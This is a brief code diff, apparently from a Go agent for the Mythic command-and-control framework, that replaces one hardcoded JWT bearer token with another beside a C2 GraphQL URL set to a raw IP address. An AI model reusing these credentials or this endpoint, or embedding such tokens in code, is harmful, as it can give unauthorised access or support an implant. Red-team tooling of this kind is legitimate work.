@@ -54,7 +54,7 @@ var (
 // Global variables
 var (
         mythicURL   = "https://37.27.249.191:7443/graphql/"
-        jwtToken    = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ0MDI0MzMsIm5iZiI6MTczNDQwMjQzMywianRpIjoiZWZjZDU3MDUtMWM5Zi00MzE3LWJhMGMtMWU4MjJhZGNlYjJhIiwiZXhwIjoxNzM0NDg4ODMzLCJpZGVudGl0eSI6MiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.qMGPfPYMgO8FeZ8F0hI8c7a3G4UHZgpSoUb-JE_rLMY"
+        jwtToken    = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxNzMxMTAsImlhdCI6MTc1MDE1ODcxMCwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjE3LCJvcGVyYXRpb25faWQiOjB9.ok5pb1TKFiGGsvcWGc1LdQIM48Y1KqeXRGmmtXWKIDM"
         callbackID  = ""
         agentID     = ""
         currentDir  = ""
